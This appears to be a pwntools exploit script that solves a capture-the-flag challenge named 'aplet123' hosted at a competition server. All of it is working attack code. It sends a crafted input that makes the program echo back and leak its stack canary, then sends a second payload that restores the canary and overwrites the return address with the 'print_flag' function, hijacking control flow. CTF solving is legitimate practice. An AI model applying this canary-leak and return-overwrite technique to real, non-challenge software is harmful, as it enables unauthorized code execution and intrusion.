#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './aplet123'
elf = context.binary = ELF(exe, checksec=True)
# libc = './lib/libc.so.6'
# libc = ELF(libc, checksec=False)

context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

host, port = 'chal.amt.rs', 1338

def initialize(argv=[]):
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

r = initialize()

payload = flat({
    69: b"i\'m"
})

r.sendlineafter("hello", payload)

r.recvuntil(b'hi ')
canary_leak = r.recv(7)

log.critical(canary_leak)

rop_payload = flat({
    72: b"\x00" + canary_leak,
    88: elf.sym['print_flag']
})

r.sendline(rop_payload)
r.sendline(b"bye")

r.interactive()